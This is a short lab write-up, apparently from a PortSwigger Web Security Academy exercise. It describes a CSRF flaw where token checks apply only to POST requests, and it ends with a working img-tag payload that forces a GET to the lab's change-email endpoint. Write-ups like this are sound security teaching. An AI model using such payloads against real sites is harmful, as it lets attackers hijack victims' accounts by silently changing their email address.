
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

# Vuln assessment

The original request looks like this:

![[original-req.png]]

Change the request method and remove the token from the query params:

![[exploit-req.png]]

Send the request for the test user and note that the email changed.

# Exploitation

As only a GET request is necessary, the following payload will solve the lab:

```javascript
<img src="https://0a52003203a98e80826765090007007e.web-security-academy.net/my-account/change-email?email=test3%40test.com">
```

